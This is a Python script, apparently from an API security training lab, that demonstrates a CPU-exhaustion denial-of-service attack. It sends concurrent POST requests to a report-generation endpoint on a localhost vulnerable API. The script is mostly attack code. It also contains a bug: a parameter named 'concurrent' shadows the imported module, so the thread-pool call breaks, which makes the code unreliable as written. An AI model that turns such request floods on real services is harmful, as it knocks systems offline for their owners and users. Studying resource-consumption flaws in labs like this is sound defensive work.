#!/usr/bin/env python3
"""
API04 Unrestricted Resource Consumption - CPU Exhaustion Attack
Educational demonstration of how expensive operations can exhaust server CPU.
"""

import requests
import concurrent.futures
import time

API_URL = "http://localhost:5004"

def generate_report():
    """Trigger expensive report generation"""
    try:
        start = time.time()
        response = requests.post(
            f"{API_URL}/api/generate-report",
            json={}
        )
        duration = time.time() - start
        
        return {
            'duration': duration,
            'status': response.status_code
        }
    except Exception as e:
        return {'error': str(e)}

def cpu_attack(concurrent=5):
    """Exhaust CPU with report generation"""
    print(f"Launching {concurrent} concurrent report generations...")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=concurrent) as executor:
        futures = [executor.submit(generate_report) for _ in range(concurrent)]
        results = [f.result() for f in concurrent.futures.as_completed(futures)]
    
    for i, result in enumerate(results):
        if 'error' not in result:
            print(f"  Report {i+1}: {result['duration']:.2f}s")
        else:
            print(f"  Report {i+1}: ERROR - {result['error']}")

if __name__ == '__main__':
    print("Attacking server CPU with expensive report generation...")
    print("Monitor CPU usage with: docker stats api04-vulnerable-api\n")
    cpu_attack(concurrent=10)
